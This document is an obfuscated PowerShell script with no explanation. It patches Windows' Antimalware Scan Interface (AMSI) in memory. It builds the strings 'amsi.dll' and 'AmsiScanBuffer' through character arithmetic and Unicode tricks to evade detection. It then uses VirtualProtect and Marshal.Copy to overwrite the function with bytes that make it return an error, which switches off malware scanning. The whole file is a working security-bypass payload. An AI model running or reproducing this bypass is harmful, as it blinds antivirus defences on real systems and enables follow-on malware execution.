$bqvfm = @"
using System;
using System.Runtime.InteropServices;
public class bqvfm {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr qsizks, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $bqvfm

$fajssyh = [bqvfm]::LoadLibrary("$(('ámsí'+'.dll').NORmAliZe([CHAr](70*30/30)+[char]([BYte]0x6f)+[CHAr]([ByTE]0x72)+[cHAR](109)+[Char](68)) -replace [cHaR](92+74-74)+[ChAr]([BYte]0x70)+[ChaR]([byTe]0x7b)+[chAr]([BYtE]0x4d)+[CHaR](45+65)+[CHAr]([Byte]0x7d))")
$mwlust = [bqvfm]::GetProcAddress($fajssyh, "$(('ÄmsíSc'+'ànBuff'+'er').NoRMALIZe([CHar](70)+[cHar](111*79/79)+[CHAr](67+47)+[cHar](109+91-91)+[cHAr](68)) -replace [cHAR]([BYTe]0x5c)+[cHar]([ByTE]0x70)+[char]([byte]0x7b)+[ChAr]([byte]0x4d)+[cHar](110+39-39)+[chaR]([ByTe]0x7d))")
$p = 0
[bqvfm]::VirtualProtect($mwlust, [uint32]5, 0x40, [ref]$p)
$nyco = "0xB8"
$tngw = "0x57"
$vdcb = "0x00"
$voip = "0x07"
$cowi = "0x80"
$xbdv = "0xC3"
$utoyw = [Byte[]] ($nyco,$tngw,$vdcb,$voip,+$cowi,+$xbdv)
[System.Runtime.InteropServices.Marshal]::Copy($utoyw, 0, $mwlust, 6)
